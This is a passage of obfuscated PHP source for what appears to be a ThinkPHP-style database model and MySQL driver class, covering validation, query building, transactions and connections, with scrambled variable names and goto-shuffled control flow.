(trim($AÅÖÛŒ¨Ö[3])) { case $D»Øíë›Ñ¸[319]: case $D»Øíë›Ñ¸[320]: $A¹¤ëŸƒ«í = isset($AÅÖÛŒ¨Ö[4]) ? (array) $AÅÖÛŒ¨Ö[4] : array(); if (isset($D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]])) { array_unshift($A¹¤ëŸƒ«í, $D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]]); } if ($D»Øíë›Ñ¸[319] == $AÅÖÛŒ¨Ö[3]) { $D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]] = call_user_func_array($AÅÖÛŒ¨Ö[1], $A¹¤ëŸƒ«í); } else { $D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]] = call_user_func_array(array(&$this, $AÅÖÛŒ¨Ö[1]), $A¹¤ëŸƒ«í); } break; case $D»Øíë›Ñ¸[271]: $D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]] = $D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[1]]; break; case $D»Øíë›Ñ¸[321]: if ($D»Øíë›Ñ¸[33] === $D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]]) { unset($D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]]); } break; case $D»Øíë›Ñ¸[322]: default: $D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]] = $AÅÖÛŒ¨Ö[1]; } if (!1 === $D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]]) { unset($D›’˜ÒåğÍ[$AÅÖÛŒ¨Ö[0]]); } } } } return $D›’˜ÒåğÍ; } protected function autoValidation($eçìé¢’â‰, $CÂ—¾í£³Œ) { $A³Õ‰™Èöß =& $_SERVER[›é¼±]; if (!empty($this->options[$A³Õ‰™Èöß[323]])) { $C…‰¶˜Ä–× = $this->options[$A³Õ‰™Èöß[323]]; unset($this->options[$A³Õ‰™Èöß[323]]); } elseif (!empty($this->_validate)) { $C…‰¶˜Ä–× = $this->_validate; } if (isset($C…‰¶˜Ä–×)) { if ($this->patchValidate) { $this->error = array(); } foreach ($C…‰¶˜Ä–× as $dèù©ª»… => $FÓ­¨ë­±) { if (empty($FÓ­¨ë­±[5]) || $FÓ­¨ë­±[5] == THINK_MODEL_BOTH || $FÓ­¨ë­±[5] == $CÂ—¾í£³Œ) { if (0 == strpos($FÓ­¨ë­±[2], $A³Õ‰™Èöß[324]) && strpos($FÓ­¨ë­±[2], $A³Õ‰™Èöß[325])) { $FÓ­¨ë­±[2] = think_lang(substr($FÓ­¨ë­±[2], 2, -1)); } $FÓ­¨ë­±[3] = isset($FÓ­¨ë­±[3]) ? $FÓ­¨ë­±[3] : THINK_EXISTS_VALIDATE; $FÓ­¨ë­±[4] = isset($FÓ­¨ë­±[4]) ? $FÓ­¨ë­±[4] : $A³Õ‰™Èöß[326]; switch ($FÓ­¨ë­±[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($eçìé¢’â‰, $FÓ­¨ë­±)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($A³Õ‰™Èöß[33] != trim($eçìé¢’â‰[$FÓ­¨ë­±[0]])) { if (!1 === $this->_validationField($eçìé¢’â‰, $FÓ­¨ë­±)) { return !1; } } break; default: if (isset($eçìé¢’â‰[$FÓ­¨ë­±[0]])) { if (!1 === $this->_validationField($eçìé¢’â‰, $FÓ­¨ë­±)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($eÑ£ËÕÒÊÛ, $f‹’ì§Û…) { if (!1 === $this->_validationFieldItem($eÑ£ËÕÒÊÛ, $f‹’ì§Û…)) { if ($this->patchValidate) { $this->error[$f‹’ì§Û…[0]] = $f‹’ì§Û…[2]; } else { $this->error = $f‹’ì§Û…[2]; return !1; } } return; } protected function _validationFieldItem($d×ù¿«¢ª±, $bçõÇàÑ) { $Fùˆ°²ÒŸ =& $_SERVER[›é¼±]; switch (strtolower(trim($bçõÇàÑ[4]))) { case $Fùˆ°²ÒŸ[319]: case $Fùˆ°²ÒŸ[320]: $B»ßÄõ˜Ä” = isset($bçõÇàÑ[6]) ? (array) $bçõÇàÑ[6] : array(); if (is_string($bçõÇàÑ[0]) && strpos($bçõÇàÑ[0], $Fùˆ°²ÒŸ[47])) { $bçõÇàÑ[0] = explode($Fùˆ°²ÒŸ[47], $bçõÇàÑ[0]); } if (is_array($bçõÇàÑ[0])) { foreach ($bçõÇàÑ[0] as $dÄ„µÁÜ) { $D‡µÉ…Â³¸[$dÄ„µÁÜ] = $d×ù¿«¢ª±[$dÄ„µÁÜ]; } array_unshift($B»ßÄõ˜Ä”, $D‡µÉ…Â³¸); } else { array_unshift($B»ßÄõ˜Ä”, $d×ù¿«¢ª±[$bçõÇàÑ[0]]); } if ($Fùˆ°²ÒŸ[319] == $bçõÇàÑ[4]) { return call_user_func_array($bçõÇàÑ[1], $B»ßÄõ˜Ä”); } else { return call_user_func_array(array(&$this, $bçõÇàÑ[1]), $B»ßÄõ˜Ä”); } case $Fùˆ°²ÒŸ[327]: return $d×ù¿«¢ª±[$bçõÇàÑ[0]] == $d×ù¿«¢ª±[$bçõÇàÑ[1]]; case $Fùˆ°²ÒŸ[328]: if (is_string($bçõÇàÑ[0]) && strpos($bçõÇàÑ[0], $Fùˆ°²ÒŸ[47])) { $bçõÇàÑ[0] = explode($Fùˆ°²ÒŸ[47], $bçõÇàÑ[0]); } $f‘¹ø¶¹ïÆ = array(); if (is_array($bçõÇàÑ[0])) { foreach ($bçõÇàÑ[0] as $dÄ„µÁÜ) { $f‘¹ø¶¹ïÆ[$dÄ„µÁÜ] = $d×ù¿«¢ª±[$dÄ„µÁÜ]; } } else { $f‘¹ø¶¹ïÆ[$bçõÇàÑ[0]] = $d×ù¿«¢ª±[$bçõÇàÑ[0]]; } if (!empty($d×ù¿«¢ª±[$this->getPk()])) { $f‘¹ø¶¹ïÆ[$this->getPk()] = array($Fùˆ°²ÒŸ[329], $d×ù¿«¢ª±[$this->getPk()]); } if ($this->where($f‘¹ø¶¹ïÆ)->find()) { return !1; } return !0; default: return $this->check($d×ù¿«¢ª±[$bçõÇàÑ[0]], $bçõÇàÑ[1], $bçõÇàÑ[4]); } } public function check($AÜÆïù£Ğë, $C©†àŒËŒ‘, $EÕ“Ç°ê…˜ = "\162\x65\147\145\170") { $B‹ÈƒÂĞŞ =& $_SERVER[›é¼±]; $EÕ“Ç°ê…˜ = strtolower(trim($EÕ“Ç°ê…˜)); switch ($EÕ“Ç°ê…˜) { case $B‹ÈƒÂĞŞ[7]: case $B‹ÈƒÂĞŞ[330]: $aºßùáïŒ = is_array($C©†àŒËŒ‘) ? $C©†àŒËŒ‘ : explode($B‹ÈƒÂĞŞ[47], $C©†àŒËŒ‘); return $EÕ“Ç°ê…˜ == $B‹ÈƒÂĞŞ[7] ? in_array($AÜÆïù£Ğë, $aºßùáïŒ) : !in_array($AÜÆïù£Ğë, $aºßùáïŒ); case $B‹ÈƒÂĞŞ[331]: case $B‹ÈƒÂĞŞ[332]: if (is_array($C©†àŒËŒ‘)) { $a”ÊØŞ·çË = $C©†àŒËŒ‘[0]; $Dœ˜Á®±¼Ø = $C©†àŒËŒ‘[1]; } else { list($a”ÊØŞ·çË, $Dœ˜Á®±¼Ø) = explode($B‹ÈƒÂĞŞ[47], $C©†àŒËŒ‘); } return $EÕ“Ç°ê…˜ == $B‹ÈƒÂĞŞ[331] ? $AÜÆïù£Ğë >= $a”ÊØŞ·çË && $AÜÆïù£Ğë <= $Dœ˜Á®±¼Ø : $AÜÆïù£Ğë < $a”ÊØŞ·çË || $AÜÆïù£Ğë > $Dœ˜Á®±¼Ø; case $B‹ÈƒÂĞŞ[333]: case $B‹ÈƒÂĞŞ[334]: return $EÕ“Ç°ê…˜ == $B‹ÈƒÂĞŞ[333] ? $AÜÆïù£Ğë == $C©†àŒËŒ‘ : $AÜÆïù£Ğë != $C©†àŒËŒ‘; case $B‹ÈƒÂĞŞ[335]: $bŠ“ÊÄ®¿ë = mb_strlen($AÜÆïù£Ğë, $B‹ÈƒÂĞŞ[336]); if (strpos($C©†àŒËŒ‘, $B‹ÈƒÂĞŞ[47])) { list($a”ÊØŞ·çË, $Dœ˜Á®±¼Ø) = explode($B‹ÈƒÂĞŞ[47], $C©†àŒËŒ‘); return $bŠ“ÊÄ®¿ë >= $a”ÊØŞ·çË && $bŠ“ÊÄ®¿ë <= $Dœ˜Á®±¼Ø; } else { return $bŠ“ÊÄ®¿ë == $C©†àŒËŒ‘; } case $B‹ÈƒÂĞŞ[337]: list($Bñ»ª•‹“¹, $B …°ß¦Ê) = explode($B‹ÈƒÂĞŞ[47], $C©†àŒËŒ‘); if (!is_numeric($Bñ»ª•‹“¹)) { $Bñ»ª•‹“¹ = strtotime($Bñ»ª•‹“¹); } if (!is_numeric($B …°ß¦Ê)) { $B …°ß¦Ê = strtotime($B …°ß¦Ê); } return NOW_TIME >= $Bñ»ª•‹“¹ && NOW_TIME <= $B …°ß¦Ê; case $B‹ÈƒÂĞŞ[338]: return in_array(get_client_ip(), explode($B‹ÈƒÂĞŞ[47], $C©†àŒËŒ‘)); case $B‹ÈƒÂĞŞ[339]: return !in_array(get_client_ip(), explode($B‹ÈƒÂĞŞ[47], $C©†àŒËŒ‘)); case $B‹ÈƒÂĞŞ[326]: default: return $this->regex($AÜÆïù£Ğë, $C©†àŒËŒ‘); } } public function query($f‡Ïƒ’İ‡ , $Cê†ÅÖŠÊç = false) { $aéèˆ…‚ =& $_SERVER[›é¼±]; if (!is_bool($Cê†ÅÖŠÊç) && !is_array($Cê†ÅÖŠÊç)) { $Cê†ÅÖŠÊç = func_get_args(); array_shift($Cê†ÅÖŠÊç); } $f‡Ïƒ’İ‡  = str_replace(array($aéèˆ…‚[229], $aéèˆ…‚[340]), $aéèˆ…‚[50], $f‡Ïƒ’İ‡ ); $f‡Ïƒ’İ‡  = $this->parseSql($f‡Ïƒ’İ‡ , $Cê†ÅÖŠÊç); return $this->db->query($f‡Ïƒ’İ‡ ); } public function execute($bš¦ï·’–, $Bëš¶·›Î¦ = false) { if (!is_bool($Bëš¶·›Î¦) && !is_array($Bëš¶·›Î¦)) { $Bëš¶·›Î¦ = func_get_args(); array_shift($Bëš¶·›Î¦); } $bš¦ï·’– = $this->parseSql($bš¦ï·’–, $Bëš¶·›Î¦); return $this->db->execute($bš¦ï·’–); } protected function parseSql($Aé£ƒµ‚é, $eŒ”İì¼Š¿) { $eÇí÷šÌ =& $_SERVER[›é¼±]; if (!0 === $eŒ”İì¼Š¿) { $e¡Ãá»Äƒ™ = $this->_parseOptions(); $Aé£ƒµ‚é = $this->db->parseSql($Aé£ƒµ‚é, $e¡Ãá»Äƒ™); } elseif (is_array($eŒ”İì¼Š¿)) { $eŒ”İì¼Š¿ = array_map(array($this->db, $eÇí÷šÌ[341]), $eŒ”İì¼Š¿); $Aé£ƒµ‚é = vsprintf($Aé£ƒµ‚é, $eŒ”İì¼Š¿); } else { $Aé£ƒµ‚é = strtr($Aé£ƒµ‚é, array($eÇí÷šÌ[342] => $this->getTableName(), $eÇí÷šÌ[343] => think_config($eÇí÷šÌ[242]))); } $this->db->setModel($this->name); return $Aé£ƒµ‚é; } public function db($A­©‘ßµÂ… = '', $CõËä§¯ì¼ = '', $bğÀ«óÇ’ = array()) { goto eÙÏêàï¥¦; a—‰¸¹Ä¼ª: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto Cá’—Ğõ¨; aÚƒÀÚãõÄ: $a«°©À‰òš[$A­©‘ßµÂ…] = $CõËä§¯ì¼; $this->db = $c¨ÍšœøŸ[$A­©‘ßµÂ…]; $this->_after_db(); goto a—‰¸¹Ä¼ª; eÙÏêàï¥¦: $a¬ƒæ‘õÂ =& $_SERVER[›é¼±]; if ($a¬ƒæ‘õÂ[33] === $A­©‘ßµÂ… && $this->db) { return $this->db; } static $a«°©À‰òš = array(); goto DŒ‰îÔİ¿„; DŒ‰îÔİ¿„: static $c¨ÍšœøŸ = array(); if (!isset($c¨ÍšœøŸ[$A­©‘ßµÂ…]) || isset($c¨ÍšœøŸ[$A­©‘ßµÂ…]) && $CõËä§¯ì¼ && $a«°©À‰òš[$A­©‘ßµÂ…] != $CõËä§¯ì¼) { if (!empty($CõËä§¯ì¼) && is_string($CõËä§¯ì¼) && !1 === strpos($CõËä§¯ì¼, $a¬ƒæ‘õÂ[8])) { $CõËä§¯ì¼ = think_config($CõËä§¯ì¼); } $c¨ÍšœøŸ[$A­©‘ßµÂ…] = Db::getInstance($CõËä§¯ì¼); } elseif (NULL === $CõËä§¯ì¼) { $c¨ÍšœøŸ[$A­©‘ßµÂ…]->close(); unset($c¨ÍšœøŸ[$A­©‘ßµÂ…]); return; } if (!empty($bğÀ«óÇ’)) { if (is_string($bğÀ«óÇ’)) { parse_str($bğÀ«óÇ’, $bğÀ«óÇ’); } foreach ($bğÀ«óÇ’ as $DÚ‘¯«Ò„ù => $D„İ¢Œ—Øç) { $this->setProperty($DÚ‘¯«Ò„ù, $D„İ¢Œ—Øç); } } goto aÚƒÀÚãõÄ; Cá’—Ğõ¨: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $bŠÑ¶¬Èóï = get_class($this); if ($bŠÑ¶¬Èóï == $_SERVER[›é¼±][344]) { return $this->name; } $this->name = substr($bŠÑ¶¬Èóï, 0, -5); } return $this->name; } public function getTableName() { $C™ì¹”¨± =& $_SERVER[›é¼±]; if (empty($this->trueTableName)) { $Eèîë—÷í” = !empty($this->tablePrefix) ? $this->tablePrefix : $C™ì¹”¨±[33]; if (!empty($this->tableName)) { $Eèîë—÷í” .= $this->tableName; } else { $Eèîë—÷í” .= think_parse_name($this->name); } $this->trueTableName = strtolower($Eèîë—÷í”); } return (!empty($this->dbName) ? $this->dbName . $C™ì¹”¨±[95] : $C™ì¹”¨±[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $B’‰õô“Œª =& $_SERVER[›é¼±]; return isset($this->fields[$B’‰õô“Œª[249]]) ? $this->fields[$B’‰õô“Œª[249]] : $this->pk; } public function getDbFields() { $fİ§ÃÀäà =& $_SERVER[›é¼±]; if (isset($this->options[$fİ§ÃÀäà[277]])) { $e†‰Ö¿ì¶Ù = $this->db->getFields($this->options[$fİ§ÃÀäà[277]]); return $e†‰Ö¿ì¶Ù ? array_keys($e†‰Ö¿ì¶Ù) : !1; } if ($this->fields) { $e†‰Ö¿ì¶Ù = $this->fields; unset($e†‰Ö¿ì¶Ù[$fİ§ÃÀäà[248]], $e†‰Ö¿ì¶Ù[$fİ§ÃÀäà[249]], $e†‰Ö¿ì¶Ù[$fİ§ÃÀäà[250]], $e†‰Ö¿ì¶Ù[$fİ§ÃÀäà[247]]); return $e†‰Ö¿ì¶Ù; } return !1; } public function data($DŠ³‹ô‹¤¹ = '') { $cÓò†ƒèã‚ =& $_SERVER[›é¼±]; if ($cÓò†ƒèã‚[33] === $DŠ³‹ô‹¤¹ && !empty($this->data)) { return $this->data; } if (is_object($DŠ³‹ô‹¤¹)) { $DŠ³‹ô‹¤¹ = get_object_vars($DŠ³‹ô‹¤¹); } elseif (is_string($DŠ³‹ô‹¤¹)) { parse_str($DŠ³‹ô‹¤¹, $DŠ³‹ô‹¤¹); } elseif (!is_array($DŠ³‹ô‹¤¹)) { think_exception(think_lang($cÓò†ƒèã‚[269])); } $this->data = $DŠ³‹ô‹¤¹; return $this; } public function join($cêÖ³ÉÏš) { $Aéí‰ÁëÄê =& $_SERVER[›é¼±]; if (is_array($cêÖ³ÉÏš)) { $this->options[$Aéí‰ÁëÄê[280]] = $cêÖ³ÉÏš; } elseif (!empty($cêÖ³ÉÏš)) { $this->options[$Aéí‰ÁëÄê[280]][] = $cêÖ³ÉÏš; } return $this; } public function union($DœÔº”¥Ô¥, $F¸˜ÊªËÁ½ = false) { goto D‡áÇ˜¤Ë¡; cœ‡Òóó‡: if (is_object($DœÔº”¥Ô¥)) { $DœÔº”¥Ô¥ = get_object_vars($DœÔº”¥Ô¥); } if (is_string($DœÔº”¥Ô¥)) { $FÑÇ‘ùŸ‚ = $DœÔº”¥Ô¥; } elseif (is_array($DœÔº”¥Ô¥)) { if (isset($DœÔº”¥Ô¥[0])) { $this->options[$b®æÇŒË‚á[345]] = array_merge($this->options[$b®æÇŒË‚á[345]], $DœÔº”¥Ô¥); return $this; } else { $FÑÇ‘ùŸ‚ = $DœÔº”¥Ô¥; } } else { think_exception(think_lang($b®æÇŒË‚á[269])); } $this->options[$b®æÇŒË‚á[345]][] = $FÑÇ‘ùŸ‚; goto a·÷î Òêù; a·÷î Òêù: return $this; goto AÂØĞì†Š; D‡áÇ˜¤Ë¡: $b®æÇŒË‚á =& $_SERVER[›é¼±]; if (empty($DœÔº”¥Ô¥)) { return $this; } if ($F¸˜ÊªËÁ½) { $this->options[$b®æÇŒË‚á[345]][$b®æÇŒË‚á[346]] = !0; } goto cœ‡Òóó‡; AÂØĞì†Š: } public function cache($bãÏÇäÂÕ = true, $dàÒÄÄï = null, $fçÚÄ®ÛåÖ = '') { $b¿¶¡ ‰µÕ =& $_SERVER[›é¼±]; if (!1 !== $bãÏÇäÂÕ) { $this->options[$b¿¶¡ ‰µÕ[347]] = array($b¿¶¡ ‰µÕ[93] => $bãÏÇäÂÕ, $b¿¶¡ ‰µÕ[337] => $dàÒÄÄï, $b¿¶¡ ‰µÕ[29] => $fçÚÄ®ÛåÖ); } return $this; } public function field($cŠÊŸƒˆª, $døÆ‚£Üå¿ = false) { $Eæ²ˆÚğº =& $_SERVER[›é¼±]; if (!0 === $cŠÊŸƒˆª) { $bÓŞ•áËİ = $this->getDbFields(); $cŠÊŸƒˆª = $bÓŞ•áËİ ? $bÓŞ•áËİ : $Eæ²ˆÚğº[182]; } elseif ($døÆ‚£Üå¿) { if (is_string($cŠÊŸƒˆª)) { $cŠÊŸƒˆª = explode($Eæ²ˆÚğº[47], $cŠÊŸƒˆª); } $bÓŞ•áËİ = $this->getDbFields(); $cŠÊŸƒˆª = $bÓŞ•áËİ ? array_diff($bÓŞ•áËİ, $cŠÊŸƒˆª) : $cŠÊŸƒˆª; } $this->options[$Eæ²ˆÚğº[271]] = $cŠÊŸƒˆª; return $this; } public function scope($f»ÀÖßçŠÂ = '', $a‰éí‡‡Ş = NULL) { $bÑ‚ˆä˜™¯ =& $_SERVER[›é¼±]; if ($bÑ‚ˆä˜™¯[33] === $f»ÀÖßçŠÂ) { if (isset($this->_scope[$bÑ‚ˆä˜™¯[34]])) { $aåÃÛïÃ¦‹ = $this->_scope[$bÑ‚ˆä˜™¯[34]]; } else { return $this; } } elseif (is_string($f»ÀÖßçŠÂ)) { $Aç˜øÆ³£ß = explode($bÑ‚ˆä˜™¯[47], $f»ÀÖßçŠÂ); $aåÃÛïÃ¦‹ = array(); foreach ($Aç˜øÆ³£ß as $aà¢÷ùì”‹) { if (!isset($this->_scope[$aà¢÷ùì”‹])) { continue; } $aåÃÛïÃ¦‹ = array_merge($aåÃÛïÃ¦‹, $this->_scope[$aà¢÷ùì”‹]); } if (!empty($a‰éí‡‡Ş) && is_array($a‰éí‡‡Ş)) { $aåÃÛïÃ¦‹ = array_merge($aåÃÛïÃ¦‹, $a‰éí‡‡Ş); } } elseif (is_array($f»ÀÖßçŠÂ)) { $aåÃÛïÃ¦‹ = $f»ÀÖßçŠÂ; } if (is_array($aåÃÛïÃ¦‹) && !empty($aåÃÛïÃ¦‹)) { $this->options = array_merge($this->options, array_change_key_case($aåÃÛïÃ¦‹)); } return $this; } public function where($a«À¬ƒİ¹Ó, $dÏÕ±Á«Ï“ = null) { $BÎîÈÕ½ÁÜ =& $_SERVER[›é¼±]; if (!is_null($dÏÕ±Á«Ï“) && is_string($a«À¬ƒİ¹Ó)) { if (!is_array($dÏÕ±Á«Ï“)) { $dÏÕ±Á«Ï“ = func_get_args(); array_shift($dÏÕ±Á«Ï“); } $dÏÕ±Á«Ï“ = array_map(array($this->db, $BÎîÈÕ½ÁÜ[341]), $dÏÕ±Á«Ï“); $a«À¬ƒİ¹Ó = vsprintf($a«À¬ƒİ¹Ó, $dÏÕ±Á«Ï“); } elseif (is_object($a«À¬ƒİ¹Ó)) { $a«À¬ƒİ¹Ó = get_object_vars($a«À¬ƒİ¹Ó); } elseif (is_array($a«À¬ƒİ¹Ó)) { foreach ($a«À¬ƒİ¹Ó as $dÑèâ›Ÿ’Ã => $aµ¦£ªõ¶¡) { if ((is_numeric($dÑèâ›Ÿ’Ã) || !$dÑèâ›Ÿ’Ã) && is_string($aµ¦£ªõ¶¡)) { if (strpos($aµ¦£ªõ¶¡, $BÎîÈÕ½ÁÜ[348]) === 0) { continue; } think_trace($BÎîÈÕ½ÁÜ[349], $BÎîÈÕ½ÁÜ[33], $BÎîÈÕ½ÁÜ[46]); die; } } } if (is_string($a«À¬ƒİ¹Ó) && $BÎîÈÕ½ÁÜ[33] != $a«À¬ƒİ¹Ó) { $eœæä›²¥ğ = array(); $eœæä›²¥ğ[$BÎîÈÕ½ÁÜ[350]] = $a«À¬ƒİ¹Ó; $a«À¬ƒİ¹Ó = $eœæä›²¥ğ; } if (isset($this->options[$BÎîÈÕ½ÁÜ[273]])) { $this->options[$BÎîÈÕ½ÁÜ[273]] = array_merge($this->options[$BÎîÈÕ½ÁÜ[273]], $a«À¬ƒİ¹Ó); } else { $this->options[$BÎîÈÕ½ÁÜ[273]] = $a«À¬ƒİ¹Ó; } return $this; } public function limit($F¶ŒÚÉæ¦ä, $EåÅõ‰Ûšø = null) { $Eèƒ¹ÂÅ  =& $_SERVER[›é¼±]; $this->options[$Eèƒ¹ÂÅ [290]] = is_null($EåÅõ‰Ûšø) ? $F¶ŒÚÉæ¦ä : $F¶ŒÚÉæ¦ä . $Eèƒ¹ÂÅ [47] . $EåÅõ‰Ûšø; return $this; } public function page($D–§…•†, $B¿«†ô‡Ë± = null) { $Fœ¦—¨¡±Î =& $_SERVER[›é¼±]; $this->options[$Fœ¦—¨¡±Î[351]] = is_null($B¿«†ô‡Ë±) ? $D–§…•† : $D–§…•† . $Fœ¦—¨¡±Î[47] . $B¿«†ô‡Ë±; return $this; } public function comment($dò·”¸¼Ù) { $this->options[$_SERVER[›é¼±][352]] = $dò·”¸¼Ù; return $this; } public function setProperty($f®¥Ì‘–²…, $bÌÊÏ²ˆ) { if (property_exists($this, $f®¥Ì‘–²…)) { $this->{$f®¥Ì‘–²…} = $bÌÊÏ²ˆ; } return $this; } } goto a¼ì­÷§Œ; Bá†ë—È›‚: class DbMysql extends Db { public function __construct($a™„ˆö¡Ì = '') { $f¬–ƒåäÆ› =& $_SERVER[›é¼±]; if (!extension_loaded($f¬–ƒåäÆ›[796])) { think_exception(think_lang($f¬–ƒåäÆ›[10]) . $f¬–ƒåäÆ›[880]); } if (!empty($a™„ˆö¡Ì)) { $this->config = $a™„ˆö¡Ì; if (empty($this->config[$f¬–ƒåäÆ›[13]])) { $this->config[$f¬–ƒåäÆ›[13]] = $f¬–ƒåäÆ›[33]; } } } public function connect($fÀ‹Šº”¤‹ = '', $B×Œ‰Â¼Îï = 0, $b²Û¾Ù—˜™ = false) { $b×¡Õ¡Ø²‡ =& $_SERVER[›é¼±]; if (!isset($this->linkID[$B×Œ‰Â¼Îï])) { goto f óÖ…Úî–; f¬‹ãõ·ŠÇ: mysql_query($b×¡Õ¡Ø²‡[885] . think_config($b×¡Õ¡Ø²‡[886]) . $b×¡Õ¡Ø²‡[55], $this->linkID[$B×Œ‰Â¼Îï]); if ($aÜƒÈìƒ¨Ë > $b×¡Õ¡Ø²‡[887]) { mysql_query($b×¡Õ¡Ø²‡[888], $this->linkID[$B×Œ‰Â¼Îï]); } $this->connected = !0; goto C¯¨‡ó„È˜; f óÖ…Úî–: if (empty($fÀ‹Šº”¤‹)) { $fÀ‹Šº”¤‹ = $this->config; } $aÃ‚¢­Ô£ = $fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[881]] . ($fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[882]] ? "\72{$fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[882]]}" : $b×¡Õ¡Ø²‡[33]); $d‡šÕâ…œ‚ = !empty($fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[13]][$b×¡Õ¡Ø²‡[14]]) ? $fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[13]][$b×¡Õ¡Ø²‡[14]] : $this->pconnect; goto BÈ´–‹Øõè; C¯¨‡ó„È˜: if (1 != think_config($b×¡Õ¡Ø²‡[18])) { unset($this->config); } goto EŒİØÍÙÑ; BÈ´–‹Øõè: if ($d‡šÕâ…œ‚) { $this->linkID[$B×Œ‰Â¼Îï] = mysql_pconnect($aÃ‚¢­Ô£, $fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[883]], $fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[884]], 131072); } else { $this->linkID[$B×Œ‰Â¼Îï] = mysql_connect($aÃ‚¢­Ô£, $fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[883]], $fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[884]], !0, 131072); } if (!$this->linkID[$B×Œ‰Â¼Îï] || !empty($fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[17]]) && !mysql_select_db($fÀ‹Šº”¤‹[$b×¡Õ¡Ø²‡[17]], $this->linkID[$B×Œ‰Â¼Îï])) { think_exception(mysql_error()); } $aÜƒÈìƒ¨Ë = mysql_get_server_info($this->linkID[$B×Œ‰Â¼Îï]); goto f¬‹ãõ·ŠÇ; EŒİØÍÙÑ: } return $this->linkID[$B×Œ‰Â¼Îï]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($CÊ¾…Õ‰Ô­) { goto B×Ù„ñƒçÔ; b­ŒÜˆˆ¦: if (!$this->_linkID) { return !1; } $this->queryStr = $CÊ¾…Õ‰Ô­; if ($this->queryID) { $this->free(); } goto dÄ†µ‚«½ƒ; B×Ù„ñƒçÔ: $d³è¥”ä¶ =& $_SERVER[›é¼±]; if (0 === stripos($CÊ¾…Õ‰Ô­, $d³è¥”ä¶[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto b­ŒÜˆˆ¦; dÄ†µ‚«½ƒ: think_action_status($d³è¥”ä¶[19], 1); think_status($d³è¥”ä¶[20]); $this->queryID = mysql_query($CÊ¾…Õ‰Ô­, $this->_linkID); goto B·‡µç±´; B·‡µç±´: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto bÈÛ”éî°‰; bÈÛ”éî°‰: } public function execute($C•¹Ğ‘„‚) { goto cŞÀù©Óçİ; cŞÀù©Óçİ: $eÍ¸± µÂ =& $_SERVER[›é¼±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÊš´¤©¶¦; D–äŸ–ó¦ß: think_status($eÍ¸± µÂ[20]); $BßÈÀôä÷ = mysql_query($C•¹Ğ‘„‚, $this->_linkID); $this->debug(); goto D‡âøÚ›–; BÊš´¤©¶¦: $this->queryStr = $C•¹Ğ‘„‚; if ($this->queryID) { $this->free(); } think_action_status($eÍ¸± µÂ[21], 1); goto D–äŸ–ó¦ß; D‡âøÚ›–: if (!1 === $BßÈÀôä÷) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto E›ô÷æà¹; E›ô÷æà¹: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[›é¼±][889], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e…„œ¯ÎÙØ = mysql_query($_SERVER[›é¼±][890], $this->_linkID); $this->transTimes = 0; if (!$e…„œ¯ÎÙØ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÖöİÂÕšõ = mysql_query($_SERVER[›é¼±][891], $this->_linkID); $this->transTimes = 0; if (!$EÖöİÂÕšõ) { $this->error(); return !1; } } return !0; } private function getAll() { $eÊ¨©Áäè´ = array(); if ($this->numRows > 0) { while ($EÌ…¥™ = mysql_fetch_assoc($this->queryID)) { $eÊ¨©Áäè´[] = $EÌ…¥™; } mysql_data_seek($this->queryID, 0); } return $eÊ¨©Áäè´; } public function getFields($Eæ®Ñìõ«‘) { $CšË¢œ°¥ =& $_SERVER[›é¼±]; $CĞ°–‡Ó = $this->query($CšË¢œ°¥[892] . $this->parseKey($Eæ®Ñìõ«‘)); $d·“äµáç = array(); if ($CĞ°–‡Ó) { foreach ($CĞ°–‡Ó as $f£Ş­‡·İà => $BÈÊƒÎìˆ) { $d·“äµáç[$BÈÊƒÎìˆ[$CšË¢œ°¥[27]]] = array($CšË¢œ°¥[28] => $BÈÊƒÎìˆ[$CšË¢œ°¥[27]], $CšË¢œ°¥[29] => $BÈÊƒÎìˆ[$CšË¢œ°¥[30]], $CšË¢œ°¥[31] => (bool) (strtoupper($BÈÊƒÎìˆ[$CšË¢œ°¥[32]]) === $CšË¢œ°¥[893]), $CšË¢œ°¥[34] => $BÈÊƒÎìˆ[$CšË¢œ°¥[35]], $CšË¢œ°¥[36] => strtolower($BÈÊƒÎìˆ[$CšË¢œ°¥[37]]) == $CšË¢œ°¥[38], 